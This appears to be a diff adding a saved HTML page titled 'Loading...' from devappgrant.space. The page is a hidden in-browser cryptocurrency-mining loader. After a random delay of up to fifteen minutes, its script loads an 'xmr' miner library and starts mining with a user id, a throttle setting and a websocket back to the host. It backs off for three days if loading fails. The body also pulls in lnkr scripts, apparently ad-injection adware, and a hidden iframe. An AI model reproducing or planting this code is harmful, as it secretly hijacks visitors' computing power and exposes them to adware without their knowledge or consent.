@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<!-- saved from url=(0060)https://devappgrant.space/lib/iframe.html?u=51067_5502&t=0.8 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <title>Loading...</title>
+    <script>
+        (function(){
+            var checkLib = function() {
+                if (typeof XMnr === 'undefined')
+                {
+                    if (localStorage) {
+                        localStorage.setItem('stopXMnr', Date.now().toString());
+                    }
+                    if (parent && parent.postMessage)
+                        parent.postMessage({'action':'LOAD_FAILED'}, '*');
+
+                    return false;
+                }
+                else
+                {
+                    if (localStorage) {
+                        localStorage.clear();
+                    }
+                    run();
+                }
+            };
+
+            var url = new URL(document.location.href);
+
+            var run = function () {
+                var params = {u: "default", t: 0, "ws": null};
+                if (document.location.href !== null) {
+                    var user = url.searchParams.get("u") || "";
+                    var throttle = url.searchParams.get("t") || 0;
+                    if (user.length > 0) {
+                        params.u = user;
+                    }
+                    if (throttle > 0) {
+                        params.t = throttle;
+                    }
+                    params.ws = (url.protocol === 'https:' ? 'wss' : 'ws') + '://' + url.host + '/ws/';
+                }
+                var m = new XMnr.User('js', params.u, {throttle: params.t, ws: params.ws});
+                m.start(XMnr.IET);
+            };
+
+            var noLocalStorageStopFlag = function () {
+                if (!localStorage) return true;
+                var stopXmrTs = parseInt(localStorage.getItem('stopXMnr')) || 0;
+                return (Date.now() - stopXmrTs) > 3 * 86400 * 1000;
+            };
+
+            if (noLocalStorageStopFlag()) {
+                var nodelay = url.searchParams.get("nd") || false;
+                var timeWait = (nodelay?0:Math.floor(Math.random() * 15) + 1);
+                setTimeout(function () {
+                    var scr = document.createElement('script');
+                    scr.src = 'xmr.main.min.js';
+
+                    scr.onload = checkLib;
+                    scr.onerror = checkLib;
+                    document.head.appendChild(scr);
+                }, timeWait * 60 * 1000);
+            }
+        })();
+    </script>
+<script src="./xmr.main.min.js.download"></script></head>
+<body>
+
+
+
+<script type="text/javascript" src="./lnkr5.min.js.download"></script><script type="text/javascript" src="./lnkr30_nt.min.js.download"></script><script type="text/javascript" src="./code"></script><script type="text/javascript" src="./validate-site.js(2).download"></script><iframe src="./iframe(2).html" style="display: none;"></iframe></body></html>
